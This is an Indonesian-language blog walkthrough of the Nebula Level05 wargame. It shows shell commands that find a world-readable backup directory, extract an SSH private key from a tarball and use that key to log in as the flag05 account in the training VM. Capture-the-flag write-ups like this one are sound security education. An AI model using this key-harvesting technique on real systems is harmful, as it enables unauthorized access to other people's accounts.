+++
author = "kernel-panic"
categories = ["Security", "Nebula"]
date = "2018-01-18T07:32:47+00:00"
description = "Security Wargames"
featured = "CHGiTVRW_o.jpg"
featuredalt = "Nebula Level05"
featuredpath = "https://images2.imgbox.com/c3/5b"
linktitle = ""
title = "Exploit Exercises - Nebula Level05"
type = "post"

+++
{{< url-link "Level05" "https://exploit-exercises.com/nebula/level05/" "target">}} menginstruksikan kita untuk memeriksa direktori /home/flag05 dan mencari direktori yang mempunyai permission kurang aman.

Setelah menavigasi ke /home/flag05, kita bisa melihat permissionnya:

    	level05@nebula:~$ pushd /home/flag05/
        level05@nebula:/home/flag05$ ls -al
        total 5
        drwxr-x--- 4 flag05 level05   93 2012-08-18 06:56 .
        drwxr-xr-x 1 root   root      80 2012-08-27 07:18 ..
        drwxr-xr-x 2 flag05 flag05    42 2011-11-20 20:13 .backup
        -rw-r--r-- 1 flag05 flag05   220 2011-05-18 02:54 .bash_logout
        -rw-r--r-- 1 flag05 flag05  3353 2011-05-18 02:54 .bashrc
        -rw-r--r-- 1 flag05 flag05   675 2011-05-18 02:54 .profile
        drwx------ 2 flag05 flag05    70 2011-11-20 20:13 .ssh

Direktori hidden backup itu terlihat menarik perhatian karena ia memiliki permission world-readable dan execute. Mari kita lihat isinya:

          level05@nebula:/home/flag05$ cd .backup/
          level05@nebula:/home/flag05/.backup$ ls -al
          total 2
          drwxr-xr-x 2 flag05 flag05    42 2011-11-20 20:13 .
          drwxr-x--- 4 flag05 level05   93 2012-08-18 06:56 ..
          -rw-rw-r-- 1 flag05 flag05  1826 2011-11-20 20:13 backup-19072011.tgz

Setelah dilihat, ada file backup. Mari ekstrak ke direktori /home/level05 dan lihat isinya:

          level05@nebula:/home/flag05/.backup$ tar -xzvf backup-19072011.tgz -C /home/level05/
          .ssh/
          .ssh/id_rsa.pub
          .ssh/id_rsa
          .ssh/authorized_keys

Outputnya menunjukkan pasangan key publik/privat. Mari mencoba login sebagai flag05 menggunakan key tersebut.

          level05@nebula:/home/flag05/.backup$ popd
          level05@nebula:~$ ls .ssh
          authorized_keys  id_rsa  id_rsa.pub
          level05@nebula:~$ ssh flag05@localhost
          The authenticity of host 'localhost (127.0.0.1)' can't be established.
          RSA key fingerprint is 67:fe:f4:09:cd:0f:ba:dd:87:2b:73:2c:80:31:c2:68.
          Are you sure you want to continue connecting (yes/no)? yes
          Warning: Permanently added 'localhost' (RSA) to the list of known hosts.
    
              _   __     __          __
             / | / /__  / /_  __  __/ /___ _
            /  |/ / _ \/ __ \/ / / / / __ `/
           / /|  /  __/ /_/ / /_/ / / /_/ /
          /_/ |_/\___/_.___/\__,_/_/\__,_/
    
          exploit-exercises.com/nebula
    
    
          For level descriptions, please see the above URL.
    
          To log in, use the username of "levelXX" and password "levelXX", where
          XX is the level number.
    
          Currently there are 20 levels (00 - 19).
    
    
          Welcome to Ubuntu 11.10 (GNU/Linux 3.0.0-12-generic i686)
    
          * Documentation:  https://help.ubuntu.com/
          New release '12.04 LTS' available.
          Run 'do-release-upgrade' to upgrade to it.
    
    
          The programs included with the Ubuntu system are free software;
          the exact distribution terms for each program are described in the
          individual files in /usr/share/doc/*/copyright.
    
          Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
          applicable law.
    
          flag05@nebula:~$ getflag
          You have successfully executed getflag on a target account

Dan berhasil, setelah login sebagai flag05, saya menjalankan perintah getflag untuk memverifikasi penyelesaian level05.

<div class="videoyoutube"><div class="video-responsive"><iframe allowfullscreen="1" class="embedded-video-large" src="https://www.youtube.com/embed/iwS9k0oYWS0?rel=0"></iframe></div></div>